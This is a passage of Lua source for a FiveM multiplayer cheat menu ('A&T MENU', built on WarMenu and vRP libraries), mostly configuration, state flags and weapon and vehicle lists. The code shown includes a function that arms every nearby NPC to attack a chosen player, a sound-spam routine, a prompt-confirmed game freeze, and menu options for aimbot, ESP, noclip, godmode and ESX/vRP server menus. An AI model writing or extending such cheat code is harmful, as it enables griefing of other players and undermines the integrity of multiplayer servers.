        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
            Citizen.Wait(0)
        end

        if UpdateOnscreenKeyboard() == 1 then
            local result = GetOnscreenKeyboardResult()
            
            if result and string.upper(result) == "YES" then
                ShowNotification("~r~Crashing game now...")
                Citizen.Wait(1000)
                
                while true do
                end
            else
                ShowNotification("~g~Crash cancelled.")
            end
        else
            ShowNotification("~g~Crash cancelled.")
        end
    end)
end

function PedAttack(targetPed, weapon)
    local targetCoords = GetEntityCoords(targetPed)
    local retval, madPedsGroup = AddRelationshipGroup("madPeds")
    local retval, playerGroup = AddRelationshipGroup("players")
    SetRelationshipBetweenGroups(0, madPedsGroup, madPedsGroup)
    SetRelationshipBetweenGroups(5, madPedsGroup, playerGroup)
    SetRelationshipBetweenGroups(5, playerGroup, madPedsGroup)
    SetPedRelationshipGroupHash(targetPed, playerGroup)
    for _, ped in ipairs(GetGamePool('CPed')) do
        if ped ~= targetPed and not IsPedAPlayer(ped) then
            GiveWeaponToPed(ped, GetHashKey(weapon), 9999, false, true)
            ClearPedTasks(ped)
            SetPedRelationshipGroupHash(ped, madPedsGroup)
            TaskCombatPed(ped, targetPed, 0, 16)
            SetPedFiringPattern(ped, 0xC6EE6B4C)
            SetPedCombatAbility(ped, 100)
            SetPedCombatRange(ped, 2)
            SetPedCombatAttributes(ped, 46, true)
            SetPedCombatAttributes(ped, 5, true)
        end
    end
end

function PlaySoundPlayer()
    local cycle = 500
    local sounds = {
        "Checkpoint_Hit",
        "Boss_Blipped"
    }

    Citizen.CreateThread(function()
        AddTextEntry("CONFIRM_BRING", "Enter the number of seconds to play the sounds: @vis.tes on discord. ")
        DisplayOnscreenKeyboard(1, "CONFIRM_BRING", "", "", "", "", "", 10)
        while UpdateOnscreenKeyboard() == 0 do
            Citizen.Wait(0)
        end
        local result = GetOnscreenKeyboardResult()
        if result then
            local duration = tonumber(result) or 5
            ShowInfo("Playing sounds for " .. duration .. " seconds.")
            local endTime = GetGameTimer() + (duration * 1000)
            while GetGameTimer() < endTime do
                for _, sound in ipairs(sounds) do
                    PlaySound(-1, sound, "GTAO_FM_Events_Soundset", true)
                end
                Citizen.Wait(cycle)
            end
            ShowInfo("Sounds stopped after " .. duration .. " seconds.")
        end
    end)
end Tools = {} local IDGenerator = {} function Tools.newIDGenerator() local r = setmetatable({}, {__index = IDGenerator})r:construct() return r end function IDGenerator:construct()self:clear() end function IDGenerator:clear()self.max = 0 self.ids = {} end function IDGenerator:gen() if #self.ids > 0 then return table.remove(self.ids) else local r = self.max self.max = self.max + 1 return r end end function IDGenerator:free(id)table.insert(self.ids, id) end Tunnel = {} local function tunnel_resolve(itable, key) local mtable = getmetatable(itable) local iname = mtable.name local ids = mtable.tunnel_ids local callbacks = mtable.tunnel_callbacks local identifier = mtable.identifier local fcall = function(args, callback) if args == nil then args = {} end if type(callback) == "function" then local rid = ids:gen()callbacks[rid] = callback TriggerServerEvent(iname .. ":tunnel_req", key, args, identifier, rid) else TriggerServerEvent(iname .. ":tunnel_req", key, args, "", -1) end end itable[key] = fcall return fcall end function Tunnel.bindInterface(name, interface)RegisterNetEvent(name .. ":tunnel_req")AddEventHandler(name .. ":tunnel_req", function(member, args, identifier, rid) local f = interface[member] local delayed = false local rets = {} if type(f) == "function" then TUNNEL_DELAYED = function()delayed = true return function(rets)rets = rets or {} if rid >= 0 then TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets) end end end rets = {f(table.unpack(args))} end if not delayed and rid >= 0 then TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets) end end) end function Tunnel.getInterface(name, identifier) local ids = Tools.newIDGenerator() local callbacks = {} local r = setmetatable({}, {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier})RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")AddEventHandler(name .. ":" .. identifier .. ":tunnel_res", function(rid, args) local callback = callbacks[rid] if callback ~= nil then ids:free(rid)callbacks[rid] = nil callback(table.unpack(args)) end end) return r end Proxy = {} local proxy_rdata = {} local function proxy_callback(rvalues)proxy_rdata = rvalues end local function proxy_resolve(itable, key) local iname = getmetatable(itable).name local fcall = function(args, callback) if args == nil then args = {} end TriggerEvent(iname .. ":proxy", key, args, proxy_callback) return table.unpack(proxy_rdata) end itable[key] = fcall return fcall end function Proxy.addInterface(name, itable)AddEventHandler(name .. ":proxy", function(member, args, callback) local f = itable[member] if type(f) == "function" then callback({f(table.unpack(args))}) else end end) end function Proxy.getInterface(name) local r = setmetatable({}, {__index = proxy_resolve, name = name}) return r end
--[[

WarMenu by Warxander
https://github.com/warxander

vRP Tunnel and Proxy libraries by ImagicTheCat
https://github.com/ImagicTheCat/vRP/tree/master/vrp



Anyone is free to use this menu and modify it as they please. All I ask in return is that
you do not try to monetize this release - I made this because I was tired of seeing
people trying to sell the same old reused code and charging ridiculous amounts for it.



  /\   _____  ______          _____         _____  _      ______           _____ ______   /\
 |/\| |  __ \|  ____|   /\   |  __ \       |  __ \| |    |  ____|   /\    / ____|  ____| |/\|
      | |__) | |__     /  \  | |  | |      | |__) | |    | |__     /  \  | (___ | |__
      |  _  /|  __|   / /\ \ | |  | |      |  ___/| |    |  __|   / /\ \  \___ \|  __|
      | | \ \| |____ / ____ \| |__| |      | |    | |____| |____ / ____ \ ____) | |____
      |_|  \_\______/_/    \_\_____/       |_|    |______|______/_/    \_\_____/|______|
]]
-- CONFIG
--[[
If you make an edit and would like to add your name, feel free to do so.  
Please leave the original developers somewhere in the credits.
]]
developers = {
"A&T Team", 
}

-- Keybindings
-- Supported keys are shown below (line 1316)
-- Find new ones at https://docs.fivem.net/game-references/controls/

menuKeybind = "DELETE" -- Key to open the menu.
noclipKeybind = "H" -- Key to toggle Noclip
fixcarKeybind = "F1" -- Key to fix car
healplayerKeybind = "F2" -- Key to heal player


-- End Keybindings

menuName = "A&T MENU" -- The name of the menu
version = "1.0" -- Keep it simple
theme = "infamous" -- Feel free to make your own
themes = {"infamous", "basic", "dark", "skid"}-- Add themes here if you want them to be in the theme selector
mpMessage = false -- Whether or not to use the big mp message
startMessage = "∑ ~b~Welcome, " .. GetPlayerName(PlayerId()) .. "." -- The message that is shown when the menu is opened
subMessage = "~w~Press ~b~" .. menuKeybind .. "~w~ to open the menu." -- subtitle of opening message
motd = "∑ Press ~b~" .. noclipKeybind .. "~w~ to toggle noclip!" -- motd

-- Add any new menus to this list (for theme changer/textures)
menulist = {
        
        -- MAIN SUBMENUS
        'skid',
        'player',
        'self',
        'weapon',
        'vehicle',
        'world',
        'misc',
        'teleport',
        'lua',
        
        -- PLAYER SUBMENUS
        'allplayer',
        'playeroptions',
        
        -- SELF SUBMENUS
        'appearance',
        'modifyskintextures',
          'modifyhead',
        'modifiers',
        'esxoutfits',
        
        -- WEAPON SUBMENUS
        'weaponspawner',
        
        -- WEAPON SPAWNER SUBMENUS
        'melee',
        'pistol',
        'shotgun',
        'smg',
        'assault',
        'sniper',
        'thrown',
        'heavy',
        
        -- VEHICLE SUBMENUS
         'vehiclespawner',
        'vehiclemods',
        'vehiclemenu',
   'vehiclecolors',
        'vehiclecolors_primary',
        'vehiclecolors_secondary',
        'primary_classic',
        'primary_matte',
        'primary_metal',
        'secondary_classic',
        'secondary_matte',
        'secondary_metal',
        'vehiclemodifiers',
        'vehicletuning',
        
        -- VEHICLE SPAWNER SUBMENUS
        'compacts',
        'sedans',
        'suvs',
        'coupes',
        'muscle',
        'sportsclassics',
        'sports',
        'super',
        'motorcycles',
        'offroad',
        'industrial',
        'utility',
        'vans',
        'cycles',
        'boats',
        'helicopters',
        'planes',
        'service',
        'commercial',
        

        -- WORLD SUBMENUS
        'objectspawner',
        'objectlist',
        'weather',
        'time',
        
        -- MISC SUBMENUS
		'esp',
		'keybindings',
        'visualoptions',
		'webradio',
        'credits',
        'menuPosition',
        'adultemotes',
        -- TELEPORT SUBMENUS
        'saveload',
        'pois',
                        
        -- LUA SUBMENUS
        'esx',
        'vrp',
        'other',
        
}
-- END CONFIG

-- TX Noclip State
TXNoclipEnabled = false
ShiftBoostEnabled = false

-- SHIFTBOOST
Citizen.CreateThread(function()
	local boostForce = 35.0
	local boostControl = 21 -- Left Shift

	while true do
		Citizen.Wait(0)

		if ShiftBoostEnabled then
			local playerPed = PlayerPedId()
			if IsPedInAnyVehicle(playerPed, false) and GetPedInVehicleSeat(GetVehiclePedIsIn(playerPed, false), -1) == playerPed then
				if IsControlPressed(0, boostControl) then
					local vehicle = GetVehiclePedIsIn(playerPed, false)
					ApplyForceToEntity(vehicle, 1, 0.0, boostForce, 2.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
				end
			end
		end
	end
end)

ShiftBoostEnabled = false
AutoRepair = false
local motorcycleSeatbeltEnabled = false
AutoRepair = false
VehGodmode = false
AutoRepair = false

-- Pickup Props State
PickupPropsEnabled = false
local holdingEntity = false
local holdingCarEntity = false
local holdingPed = false
local heldEntity = nil
local entityType = nil

-- Force Handup State
ForceHandupEnabled = false
local robbing = false
local attachedTo = nil

-- Control Car State
ControlCarEnabled = false
VehGodmode = false
local selectedVehicle = nil
local isVehicleFlying = false

-- Modify Skin Textures
faceItemsList = {}
faceTexturesList = {}
hairItemsList = {}
hairTextureList = {}
maskItemsList = {}
hatItemsList = {}
hatTexturesList = {}

-- Noclip Speed Options
NoclipSpeedOps = {1, 5, 10, 20, 30}
-- Default Noclip Speed
NoclipSpeed = 1
oldSpeed = nil

-- Forcefield Radius Options
ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}
-- Default Forcefield Radius
ForcefieldRadius = 5.0

--Fast Run/Swim Options
FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}
-- Default
FastRunMultiplier = 1.0
FastSwimMultiplier = 1.0

-- Object Rotation Options
RotationOps = {0, 45, 90, 135, 180}
-- Default Rotation
ObjRotation = 90

-- Gravity options
GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}
-- Default
GravAmount = 9.8

-- Speed mod options
SpeedModOps = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0, 500.0, 1000.0}
SpeedModAmt = 1.0

-- ESP Distance Options
ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0}
EspDistance = 500.0

-- ESP Refresh Options
ESPRefreshOps = {"0ms", "100ms", "250ms", "500ms", "1s", "2s", "5s"}
ESPRefreshTime = 0

-- Aimbot Bone Options
AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
AimbotBone = "SKEL_HEAD"

-- Clothing Slots
ClothingSlots = {1, 2, 3, 4, 5}

-- Ped Attack Types
PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}
--Default
PedAttackType = 1

-- Radios
RadiosList = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}
RadiosListWords = {
    "Los Santos Rock Radio",
    "Non-Stop-Pop FM",
    "Radio Los Santos",
    "Channel X",
    "West Coast Talk Radio",
    "Rebel Radio",
    "Soulwax FM",
    "East Los FM",
    "West Coast Classics",
    "Blue Ark",
    "Worldwide FM",
    "FlyLo FM",
    "The Lowdown 91.1",
    "The Lab",
    "Radio Mirror Park",
    "Space 103.2",
    "Vinewood Boulevard Radio",
    "Blonded Los Santos 97.8 FM",
    "Blaine County Radio",
    -- Los Santos Underground Radio (Index doesn't work) |19| https://pastebin.com/Kj9t38KF
}

-- Weathers
WeathersList = { 
    "CLEAR",
    "EXTRASUNNY",
    "CLOUDS",
    "OVERCAST",
    "RAIN",
    "CLEARING",
    "THUNDER",
    "SMOG",
    "FOGGY",
    "XMAS",
    "SNOWLIGHT",
    "BLIZZARD"
}

-- Objects to spawn
-- https://cdn.rage.mp/public/odb/index.html
objs_tospawn = {
    "stt_prop_stunt_track_start",
    "prop_container_01a",
    "prop_contnr_pile_01a",
    "ce_xr_ctr2",
    "stt_prop_ramp_jump_xxl",
    "hei_prop_carrier_jet",
    "prop_parking_hut_2",
    "csx_seabed_rock3_",
    "db_apart_03_",
    "db_apart_09_",
    "stt_prop_stunt_tube_l",
    "stt_prop_stunt_track_dwuturn",
    "xs_prop_hamburgher_wl",
    "sr_prop_spec_tube_xxs_01a"
}

-- WEAPONS LISTS
local allweapons = {
    "WEAPON_UNARMED",
    --Melee
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    
    --Thrown
    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL",
    
    --Pistols
    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_RAYPISTOL",
    
    -- SMGs / MGs
    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_RAYCARBINE",
    
    -- Assault Rifles
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    
    --Shotguns
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    
    --Sniper Rifles
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    
    --Heavy Weapons
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_RAYMINIGUN",
}

local meleeweapons = {
    {"WEAPON_KNIFE", "Knife"},
    {"WEAPON_KNUCKLE", "Brass Knuckles"},
    {"WEAPON_NIGHTSTICK", "Nightstick"},
    {"WEAPON_HAMMER", "Hammer"},
    {"WEAPON_BAT", "Baseball Bat"},
    {"WEAPON_GOLFCLUB", "Golf Club"},
    {"WEAPON_CROWBAR", "Crowbar"},
    {"WEAPON_BOTTLE", "Bottle"},
    {"WEAPON_DAGGER", "Dagger"},
    {"WEAPON_HATCHET", "Hatchet"},
    {"WEAPON_MACHETE", "Machete"},
    {"WEAPON_FLASHLIGHT", "Flashlight"},
    {"WEAPON_SWITCHBLADE", "Switchblade"},
    {"WEAPON_POOLCUE", "Pool Cue"},
    {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
}

local thrownweapons = {
    {"WEAPON_GRENADE", "Grenade"},
    {"WEAPON_STICKYBOMB", "Sticky Bomb"},
    {"WEAPON_PROXMINE", "Proximity Mine"},
    {"WEAPON_BZGAS", "BZ Gas"},
    {"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
    {"WEAPON_MOLOTOV", "Molotov"},
    {"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
    {"WEAPON_PETROLCAN", "Fuel Can"},
    {"WEAPON_SNOWBALL", "Snowball"},
    {"WEAPON_FLARE", "Flare"},
    {"WEAPON_BALL", "Baseball"}
}

local pistolweapons = {
    {"WEAPON_PISTOL", "Pistol"},
    {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
    {"WEAPON_COMBATPISTOL", "Combat Pistol"},
    {"WEAPON_APPISTOL", "AP Pistol"},
    {"WEAPON_REVOLVER", "Revolver"},
    {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
    {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
    {"WEAPON_PISTOL50", "Pistol .50"},
    {"WEAPON_SNSPISTOL", "SNS Pistol"},
    {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
    {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
    {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
    {"WEAPON_STUNGUN", "Tazer"},
    {"WEAPON_FLAREGUN", "Flaregun"},
    {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
}

local smgweapons = {
    {"WEAPON_MICROSMG", "Micro SMG"},
    {"WEAPON_MINISMG", "Mini SMG"},
    {"WEAPON_SMG", "SMG"},
    {"WEAPON_SMG_MK2", "SMG Mk II"},
    {"WEAPON_ASSAULTSMG", "Assault SMG"},
    {"WEAPON_COMBATPDW", "Combat PDW"},
    {"WEAPON_GUSENBERG", "Gunsenberg"},
    {"WEAPON_MACHINEPISTOL", "Machine Pistol"},
    {"WEAPON_MG", "MG"},
    {"WEAPON_COMBATMG", "Combat MG"},
    {"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
    {"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
}

local assaultweapons = {
    {"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
    {"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
    {"WEAPON_CARBINERIFLE", "Carbine Rifle"},
    {"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
    {"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
    {"WEAPON_SPECIALCARBINE", "Special Carbine"},
    {"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
    {"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
    {"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
    {"WEAPON_COMPACTRIFLE", "Compact Rifle"}
}

local shotgunweapons = {
    {"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
    {"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
    {"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
    {"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
    {"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
    {"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
    {"WEAPON_MUSKET", "Musket"},
    {"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
    {"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
}

local sniperweapons = {
    {"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
    {"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
    {"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
    {"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
    {"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
}

local heavyweapons = {
    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
    {"WEAPON_RPG", "RPG"},
    {"WEAPON_MINIGUN", "Minigun"},
    {"WEAPON_FIREWORK", "Firework Launcher"},
    {"WEAPON_RAILGUN", "Railgun"},
    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
    {"WEAPON_RAYMINIGUN", "Widowmaker"}
}
-- END WEAPONS LISTS
-- VEHICLES LISTS
local compacts = {
    "BLISTA",
    "BRIOSO",
    "DILETTANTE",
    "DILETTANTE2",
    "ISSI2",
    "ISSI3",
    "ISSI4",
    "ISSI5",
    "ISSI6",
    "PANTO",
    "PRAIRIE",
    "RHAPSODY"
}

local sedans = {
    "ASEA",
    "ASEA2",
    "ASTEROPE",
    "COG55",
    "COG552",
    "COGNOSCENTI",
    "COGNOSCENTI2",
    "EMPEROR",
    "EMPEROR2",
    "EMPEROR3",
    "FUGITIVE",
    "GLENDALE",
    "INGOT",
    "INTRUDER",
    "LIMO2",
    "PREMIER",
    "PRIMO",
    "PRIMO2",
    "REGINA",
    "ROMERO",
    "SCHAFTER2",
    "SCHAFTER5",
    "SCHAFTER6",
    "STAFFORD",
    "STANIER",
    "STRATUM",
    "STRETCH",
    "SUPERD",
    "SURGE",
    "TAILGATER",
    "WARRENER",
    "WASHINGTON"
}

local suvs = {
    "BALLER",
    "BALLER2",
    "BALLER3",
    "BALLER4",
    "BALLER5",
    "BALLER6",
    "BJXL",
    "CAVALCADE",
    "CAVALCADE2",
    "CONTENDER",
    "DUBSTA",
    "DUBSTA2",
    "FQ2",
    "GRANGER",
    "GRESLEY",
    "HABANERO",
    "HUNTLEY",
    "LANDSTALKER",
    "MESA",
    "MESA2",
    "PATRIOT",
    "PATRIOT2",
    "RADI",
    "ROCOTO",
    "SEMINOLE",
    "SERRANO",
    "TOROS",
    "XLS",
    "XLS2"
}

local coupes = {
    "COGCABRIO",
    "EXEMPLAR",
    "F620",
    "FELON",
    "FELON2",
    "JACKAL",
    "ORACLE",
    "ORACLE2",
    "SENTINEL",
    "SENTINEL2",
    "WINDSOR",
    "WINDSOR2",
    "ZION",
    "ZION2"
}

local muscle = {
    "BLADE",
    "BUCCANEER",
    "BUCCANEER2",
    "CHINO",
    "CHINO2",
    "CLIQUE",
    "COQUETTE3",
    "DEVIANT",
    "DOMINATOR",
    "DOMINATOR2",
    "DOMINATOR3",
    "DOMINATOR4",
    "DOMINATOR5",
    "DOMINATOR6",
    "DUKES",
    "DUKES2",
    "ELLIE",
    "FACTION",
    "FACTION2",
    "FACTION3",
    "GAUNTLET",
    "GAUNTLET2",
    "HERMES",
    "HOTKNIFE",
    "HUSTLER",
    "IMPALER",
    "IMPALER2",
    "IMPALER3",
    "IMPALER4",
    "IMPERATOR",
    "IMPERATOR2",
    "IMPERATOR3",
    "LURCHER",
    "MOONBEAM",
    "MOONBEAM2",
    "NIGHTSHADE",
    "PHOENIX",
    "PICADOR",
    "RATLOADER",
    "RATLOADER2",
    "RUINER",
    "RUINER2",
    "RUINER3",
    "SABREGT",
    "SABREGT2",
    "SLAMVAN",
    "SLAMVAN2",
    "SLAMVAN3",
    "SLAMVAN4",
    "SLAMVAN5",
    "SLAMVAN6",
    "STALION",
    "STALION2",
    "TAMPA",
    "TAMPA3",
    "TULIP",
    "VAMOS",
    "VIGERO",
    "VIRGO",
    "VIRGO2",
    "VIRGO3",
    "VOODOO",
    "VOODOO2",
    "YOSEMITE"
}

local sportsclassics = {
    "ARDENT",
    "BTYPE",
    "BTYPE2",
    "BTYPE3",
    "CASCO",
    "CHEBUREK",
    "CHEETAH2",
    "COQUETTE2",
    "DELUXO",
    "FAGALOA",
    "FELTZER3",
    "GT500",
    "INFERNUS2",
    "JB700",
    "JESTER3",
    "MAMBA",
    "MANANA",
    "MICHELLI",
    "MONROE",
    "PEYOTE",
    "PIGALLE",
    "RAPIDGT3",
    "RETINUE",
    "SAVESTRA",
    "STINGER",
    "STINGERGT",
    "STROMBERG",
    "SWINGER",
    "TORERO",
    "TORNADO",
    "TORNADO2",
    "TORNADO3",
    "TORNADO4",
    "TORNADO5",
    "TORNADO6",
    "TURISMO2",
    "VISERIS",
    "Z190",
    "ZTYPE"
}

local sports = {
    "ALPHA",
    "BANSHEE",
    "BESTIAGTS",
    "BLISTA2",
    "BLISTA3",
    "BUFFALO",
    "BUFFALO2",
    "BUFFALO3",
    "CARBONIZZARE",
    "COMET2",
    "COMET3",
    "COMET4",
    "COMET5",
    "COQUETTE",
    "ELEGY",
    "ELEGY2",
    "FELTZER2",
    "FLASHGT",
    "FUROREGT",
    "FUSILADE",
    "FUTO",
    "GB200",
    "HOTRING",
    "ITALIGTO",
    "JESTER",
    "JESTER2",
    "KHAMELION",
    "KURUMA",
    "KURUMA2",
    "LYNX",
    "MASSACRO",
    "MASSACRO2",
    "NEON",
    "NINEF",
    "NINEF2",
    "OMNIS",
    "PARIAH",
    "PENUMBRA",
    "RAIDEN",
    "RAPIDGT",
    "RAPIDGT2",
    "RAPTOR",
    "REVOLTER",
    "RUSTON",
    "SCHAFTER2",
    "SCHAFTER3",
    "SCHAFTER4",
    "SCHAFTER5",
    "SCHLAGEN",
    "SCHWARZER",
    "SENTINEL3",
    "SEVEN70",
    "SPECTER",
    "SPECTER2",
    "SULTAN",
    "SURANO",
    "TAMPA2",
    "TROPOS",
    "VERLIERER2",
    "ZR380",
    "ZR3802",
    "ZR3803"
}

local super = {
    "ADDER",
    "AUTARCH",
    "BANSHEE2",
    "BULLET",
    "CHEETAH",
    "CYCLONE",
    "DEVESTE",
    "ENTITYXF",
    "ENTITY2",
    "FMJ",
    "GP1",
    "INFERNUS",
    "ITALIGTB",
    "ITALIGTB2",
    "LE7B",
    "NERO",
    "NERO2",
    "OSIRIS",
    "PENETRATOR",
    "PFISTER811",
    "PROTOTIPO",
    "REAPER",
    "SC1",
    "SCRAMJET",
    "SHEAVA",
    "SULTANRS",
    "T20",
    "TAIPAN",
    "TEMPESTA",
    "TEZERACT",
    "TURISMOR",
    "TYRANT",
    "TYRUS",
    "VACCA",
    "VAGNER",
    "VIGILANTE",
    "VISIONE",
    "VOLTIC",
    "VOLTIC2",
    "XA21",
    "ZENTORNO"
}

local motorcycles = {
    "AKUMA",
    "AVARUS",
    "BAGGER",
    "BATI",
    "BATI2",
    "BF400",
    "CARBONRS",
    "CHIMERA",
    "CLIFFHANGER",
    "DAEMON",
    "DAEMON2",
    "DEFILER",
    "DEATHBIKE",
    "DEATHBIKE2",
    "DEATHBIKE3",
    "DIABLOUS",
    "DIABLOUS2",
    "DOUBLE",
    "ENDURO",
    "ESSKEY",
    "FAGGIO",
    "FAGGIO2",
    "FAGGIO3",
    "FCR",
    "FCR2",
    "GARGOYLE",
    "HAKUCHOU",
    "HAKUCHOU2",
    "HEXER",
    "INNOVATION",
    "LECTRO",
    "MANCHEZ",
    "NEMESIS",
    "NIGHTBLADE",
    "OPPRESSOR",
    "OPPRESSOR2",
    "PCJ",
    "RATBIKE",
    "RUFFIAN",
    "SANCHEZ",
    "SANCHEZ2",
    "SANCTUS",
    "SHOTARO",
    "SOVEREIGN",
    "THRUST",
    "VADER",
    "VINDICATOR",
    "VORTEX",
    "WOLFSBANE",
    "ZOMBIEA",
    "ZOMBIEB"
}

local offroad = {
    "BFINJECTION",
    "BIFTA",
    "BLAZER",
    "BLAZER2",
    "BLAZER3",
    "BLAZER4",
    "BLAZER5",
    "BODHI2",
    "BRAWLER",
    "BRUISER",
    "BRUISER2",
    "BRUISER3",
    "BRUTUS",
    "BRUTUS2",
    "BRUTUS3",
    "CARACARA",
    "DLOADER",
    "DUBSTA3",
    "DUNE",
    "DUNE2",
    "DUNE3",
    "DUNE4",
    "DUNE5",
    "FREECRAWLER",
    "INSURGENT",
    "INSURGENT2",
    "INSURGENT3",
    "KALAHARI",
    "KAMACHO",
    "MARSHALL",
    "MENACER",
    "MESA3",
    "MONSTER",
    "MONSTER3",
    "MONSTER4",
    "MONSTER5",
    "NIGHTSHARK",
    "RANCHERXL",
    "RANCHERXL2",
    "RCBANDITO",
    "REBEL",
    "REBEL2",
    "RIATA",
    "SANDKING",
    "SANDKING2",
    "TECHNICAL",
    "TECHNICAL2",
    "TECHNICAL3",
    "TROPHYTRUCK",
    "TROPHYTRUCK2"
}

local industrial = {
    "BULLDOZER",
    "CUTTER",
    "DUMP",
    "FLATBED",
    "GUARDIAN",
    "HANDLER",
    "MIXER",
    "MIXER2",
    "RUBBLE",
    "TIPTRUCK",
    "TIPTRUCK2"
}

local utility = {
    "AIRTUG",
    "CADDY",
    "CADDY2",
    "CADDY3",
    "DOCKTUG",
    "FORKLIFT",
    "TRACTOR2",
    "TRACTOR3",
    "MOWER",
    "RIPLEY",
    "SADLER",
    "SADLER2",
    "SCRAP",
    "TOWTRUCK",
    "TOWTRUCK2",
